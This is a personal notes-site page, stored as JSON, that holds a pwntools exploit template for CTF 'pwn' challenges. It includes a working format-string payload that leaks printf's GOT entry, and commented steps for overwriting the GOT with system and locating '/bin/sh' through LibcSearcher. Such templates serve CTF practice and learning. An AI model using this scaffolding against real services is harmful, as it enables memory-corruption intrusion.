{"pageProps":{"note":{"id":"6czaktejjj80bj1udleo8rj","title":"Template","desc":"","updated":1672232545966,"created":1672064406757,"custom":{},"fname":"computer.security.ctf.pwn.template","type":"note","vault":{"fsPath":".","selfContained":true,"name":"dendron-note"},"contentHash":"4baa88441bd6ec9c617208a7f18740cd","links":[],"anchors":{"pwn题模板":{"type":"header","text":"pwn题模板","value":"pwn题模板","line":8,"column":0,"depth":2}},"children":[],"parent":"w5ka1vxiqngvx0e40s56y8t","data":{}},"body":"<h1 id=\"template\"><a aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#template\"></a>Template</h1>\n<h2 id=\"pwn题模板\"><a aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#pwn题模板\"></a>pwn题模板</h2>\n<pre class=\"language-py\"><code class=\"language-py\"><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span> \n<span class=\"token keyword\">import</span> os\n<span class=\"token comment\"># ========================================</span>\nis_debug <span class=\"token operator\">=</span> <span class=\"token boolean\">False</span>\nis_debug <span class=\"token operator\">=</span> <span class=\"token boolean\">True</span>\narchitecture <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token string\">\"arch\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"i386\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"os\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"linux\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"endian\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"little\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"bits\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">64</span><span class=\"token punctuation\">}</span>\narchitecture <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token string\">\"arch\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"amd64\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"os\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"linux\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"endian\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"little\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"bits\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">32</span><span class=\"token punctuation\">}</span>\n<span class=\"token comment\"># is_remote = True</span>\nis_remote <span class=\"token operator\">=</span> <span class=\"token boolean\">False</span>\nip <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span>\nport <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span>\ntarget <span class=\"token operator\">=</span> <span class=\"token string\">\"./pingme\"</span>\ntarget_libc <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span>\nenv <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\n\n<span class=\"token comment\"># ========================================</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">_which</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">return</span> os<span class=\"token punctuation\">.</span>system<span class=\"token punctuation\">(</span><span class=\"token string\">\"which \"</span> <span class=\"token operator\">+</span> p <span class=\"token operator\">+</span> <span class=\"token string\">\" >/dev/null 2>&#x26;1\"</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span>\n\n\n\n<span class=\"token comment\"># ========================================</span>\n<span class=\"token keyword\">if</span> is_debug<span class=\"token punctuation\">:</span>\n    context<span class=\"token punctuation\">.</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n    context<span class=\"token punctuation\">.</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'info'</span>\ncontext<span class=\"token punctuation\">(</span>os<span class=\"token operator\">=</span>architecture<span class=\"token punctuation\">[</span><span class=\"token string\">\"os\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>arch<span class=\"token operator\">=</span>architecture<span class=\"token punctuation\">[</span><span class=\"token string\">\"arch\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>bits<span class=\"token operator\">=</span>architecture<span class=\"token punctuation\">[</span><span class=\"token string\">\"bits\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\nelf <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span>\nlibc <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span>\n<span class=\"token keyword\">if</span> target<span class=\"token punctuation\">:</span>\n    context<span class=\"token punctuation\">.</span>binary <span class=\"token operator\">=</span> target\n    elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">if</span> target_libc<span class=\"token punctuation\">:</span>\n    libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>target_libc<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">if</span> _which<span class=\"token punctuation\">(</span><span class=\"token string\">\"tmux\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    terminal <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'tmux'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'splitw'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'-h'</span><span class=\"token punctuation\">]</span>\n<span class=\"token keyword\">elif</span> _which<span class=\"token punctuation\">(</span><span class=\"token string\">'gnome-terminal'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    terminal <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'tmux'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'--'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'sh'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'-c'</span><span class=\"token punctuation\">]</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n    terminal <span class=\"token operator\">=</span> <span class=\"token boolean\">None</span>\ncontext<span class=\"token punctuation\">.</span>terminal <span class=\"token operator\">=</span> terminal\n\n<span class=\"token keyword\">if</span> is_remote<span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span>\n            io<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span>ip<span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">except</span><span class=\"token punctuation\">:</span>\n            log<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span><span class=\"token string\">\"remote:too many requests,I am tried,sleep one second please\"</span><span class=\"token punctuation\">)</span>\n            sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">continue</span>\n        <span class=\"token keyword\">break</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span>\n            io<span class=\"token operator\">=</span>process<span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">except</span><span class=\"token punctuation\">:</span>\n            log<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span><span class=\"token string\">\"local:too many process,I can not malloc any memory\"</span><span class=\"token punctuation\">)</span>\n            log<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span><span class=\"token string\">\"bye~~\"</span><span class=\"token punctuation\">)</span>\n            exit<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">break</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">debug</span><span class=\"token punctuation\">(</span>gdbscript<span class=\"token operator\">=</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">,</span> stop<span class=\"token operator\">=</span><span class=\"token boolean\">False</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> <span class=\"token builtin\">isinstance</span><span class=\"token punctuation\">(</span>io<span class=\"token punctuation\">,</span> process<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">if</span> stop<span class=\"token punctuation\">:</span>\n            pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>io<span class=\"token punctuation\">,</span> gdbscript<span class=\"token operator\">=</span>gdbscript<span class=\"token punctuation\">)</span>\n\nstop <span class=\"token operator\">=</span> pause\nS <span class=\"token operator\">=</span> pause\nleak <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> name<span class=\"token punctuation\">,</span> address<span class=\"token punctuation\">:</span> log<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span><span class=\"token string\">\"{{}} ===> {{}}\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">,</span> <span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>address<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\ns   <span class=\"token operator\">=</span> io<span class=\"token punctuation\">.</span>send\nsl  <span class=\"token operator\">=</span> io<span class=\"token punctuation\">.</span>sendline\nsla <span class=\"token operator\">=</span> io<span class=\"token punctuation\">.</span>sendlineafter\nsa  <span class=\"token operator\">=</span> io<span class=\"token punctuation\">.</span>sendafter\nslt <span class=\"token operator\">=</span> io<span class=\"token punctuation\">.</span>sendlinethen\nst  <span class=\"token operator\">=</span> io<span class=\"token punctuation\">.</span>sendthen\nr   <span class=\"token operator\">=</span> io<span class=\"token punctuation\">.</span>recv\nrn  <span class=\"token operator\">=</span> io<span class=\"token punctuation\">.</span>recvn\nrr  <span class=\"token operator\">=</span> io<span class=\"token punctuation\">.</span>recvregex\nru  <span class=\"token operator\">=</span> io<span class=\"token punctuation\">.</span>recvuntil\nra  <span class=\"token operator\">=</span> io<span class=\"token punctuation\">.</span>recvall\nrl  <span class=\"token operator\">=</span> io<span class=\"token punctuation\">.</span>recvline\nrs  <span class=\"token operator\">=</span> io<span class=\"token punctuation\">.</span>recvlines\nrls <span class=\"token operator\">=</span> io<span class=\"token punctuation\">.</span>recvline_startswith\nrle <span class=\"token operator\">=</span> io<span class=\"token punctuation\">.</span>recvline_endswith\nrlc <span class=\"token operator\">=</span> io<span class=\"token punctuation\">.</span>recvline_contains\nia  <span class=\"token operator\">=</span> io<span class=\"token punctuation\">.</span>interactive\nic  <span class=\"token operator\">=</span> io<span class=\"token punctuation\">.</span>close\ncr  <span class=\"token operator\">=</span> io<span class=\"token punctuation\">.</span>can_recv\n\nbuffer_padding <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> offset <span class=\"token punctuation\">:</span> offset<span class=\"token operator\">*</span><span class=\"token string\">'A'</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">exec_fmt</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    io<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\n    info <span class=\"token operator\">=</span> io<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> info\n<span class=\"token comment\"># auto = FmtStr(exec_fmt)</span>\n<span class=\"token comment\"># offset = auto.offset</span>\n<span class=\"token comment\"># fmtstr_payload(7, {printf_got: system_addr})</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">DynELF_leak</span><span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">)</span>\n    p<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    payload <span class=\"token operator\">=</span> <span class=\"token string\">b\"%9$s.AAA\"</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span>\n    p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\n    data <span class=\"token operator\">=</span> p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\".AAA\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> \n    log<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span><span class=\"token string\">\"leaking: 0x%x --> %s\"</span> <span class=\"token operator\">%</span> <span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">.</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    p<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> data\n<span class=\"token comment\"># data = DynELF(DynELF_leak, elf.plt[\"printf\"],elf=elf)     # Entry point address</span>\n<span class=\"token comment\"># system_addr = data.lookup('system', 'libc')</span>\n<span class=\"token comment\"># printf_addr = data.lookup('printf', 'libc')</span>\n<span class=\"token comment\"># log.info(\"system address: 0x%x\" % system_addr)</span>\n<span class=\"token comment\"># log.info(\"printf address: 0x%x\" % printf_addr)</span>\n\n\n<span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> LibcSearcher\n<span class=\"token comment\"># libc_searcher = LibcSearcher('__libc_start_main', libc_start_main_addr)</span>\n<span class=\"token comment\"># libcbase = libc_start_main_addr - libc_searcher.dump('__libc_start_main')</span>\n<span class=\"token comment\"># system_addr = libcbase + libc_searcher.dump('system')</span>\n<span class=\"token comment\"># binsh_addr = libcbase + libc_searcher.dump('str_bin_sh')</span>\n<span class=\"token comment\"># libc_searcher = LibcSearcher('printf', printf_addr)</span>\n<span class=\"token comment\"># libcbase = printf_addr - libc_searcher.dump('printf')</span>\n<span class=\"token comment\"># system_addr = libcbase + libc_searcher.dump('system')</span>\n\n<span class=\"token comment\"># ========================================</span>\n\n\nS<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n\n<span class=\"token comment\"># debug(gdbscript=\"b *main\\r\\nb printf\")</span>\n<span class=\"token comment\"># print(hex(elf.got[\"printf\"]))</span>\nprintf_got <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">\"printf\"</span><span class=\"token punctuation\">]</span>\npayload <span class=\"token operator\">=</span> <span class=\"token string\">b\"%9$s.AAA\"</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>printf_got<span class=\"token punctuation\">)</span>\nrl<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nsl<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\ndata <span class=\"token operator\">=</span> ru<span class=\"token punctuation\">(</span><span class=\"token string\">\".AAA\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span>\nprintf_addr <span class=\"token operator\">=</span> u32<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span>\nlog<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span><span class=\"token string\">\"printf address: %s\"</span> <span class=\"token operator\">%</span> <span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>printf_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n\nia<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># S()</span>\n</code></pre>","noteIndex":{"id":"ua6fcc7oj4utcqkv8dhmcb8","title":"b1babo's note","desc":"","updated":1669076632533,"created":1668950311250,"custom":{"nav_order":0,"permalink":"/"},"fname":"root","type":"note","vault":{"fsPath":".","selfContained":true,"name":"dendron-note"},"contentHash":"15dbb1bbcda17b2620bd900a3c14c525","links":[],"anchors":{},"children":["z6zdce798dlnm1qvlbj0147","u92paxy6iqch8vik9v6f4gm"],"parent":null,"data":{},"body":"\nwrite and record something.\n"},"collectionChildren":null,"customHeadContent":null,"config":{"version":5,"dev":{"enablePreviewV2":true,"enableSelfContainedVaults":true},"commands":{"lookup":{"note":{"selectionMode":"extract","confirmVaultOnCreate":true,"vaultSelectionModeOnCreate":"smart","leaveTrace":false,"bubbleUpCreateNew":true,"fuzzThreshold":0.2}},"randomNote":{},"insertNoteLink":{"aliasMode":"none","enableMultiSelect":false},"insertNoteIndex":{"enableMarker":false},"copyNoteLink":{"aliasMode":"title"},"templateHierarchy":"template"},"workspace":{"vaults":[{"fsPath":".","selfContained":true,"name":"dendron-note"}],"journal":{"dailyDomain":"daily","name":"journal","dateFormat":"y.MM.dd","addBehavior":"childOfDomain"},"scratch":{"name":"scratch","dateFormat":"y.MM.dd.HHmmss","addBehavior":"asOwnDomain"},"task":{"name":"task","dateFormat":"y.MM.dd","addBehavior":"asOwnDomain","statusSymbols":{"":" ","wip":"w","done":"x","assigned":"a","moved":"m","blocked":"b","delegated":"l","dropped":"d","pending":"y"},"taskCompleteStatus":["done","x"],"prioritySymbols":{"H":"high","M":"medium","L":"low"},"todoIntegration":false,"createTaskSelectionType":"selection2link"},"graph":{"zoomSpeed":1,"createStub":false},"enableAutoCreateOnDefinition":false,"enableXVaultWikiLink":false,"enableRemoteVaultInit":true,"enableUserTags":true,"enableHashTags":true,"workspaceVaultSyncMode":"noCommit","enableAutoFoldFrontmatter":false,"enableEditorDecorations":true,"maxPreviewsCached":10,"maxNoteLength":204800,"enableFullHierarchyNoteTitle":false,"enableHandlebarTemplates":true,"enableSmartRefs":false},"preview":{"enableFMTitle":true,"enableNoteTitleForLink":true,"enableFrontmatterTags":true,"enableHashesForFMTags":false,"enablePrettyRefs":true,"enableKatex":true,"automaticallyShowPreview":false,"enableMermaid":true},"publishing":{"enableFMTitle":true,"enableNoteTitleForLink":true,"enablePrettyRefs":true,"enableKatex":true,"copyAssets":true,"siteHierarchies":["root"],"writeStubs":false,"siteRootDir":"docs","seo":{"title":"Dendron","description":"Personal Knowledge Space"},"github":{"enableEditLink":true,"editLinkText":"Edit this page on GitHub","editBranch":"main","editViewMode":"tree"},"enableSiteLastModified":true,"enableFrontmatterTags":true,"enableHashesForFMTags":false,"enableRandomlyColoredTags":true,"enableTaskNotes":true,"enablePrettyLinks":true,"searchMode":"search","siteUrl":"https://b1babo.github.io","enableBackLinks":true,"assetsPrefix":"/notes","enableHierarchyDisplay":true,"enableMermaid":true,"siteFaviconPath":"favicon.ico","siteIndex":"root"}}},"__N_SSG":true}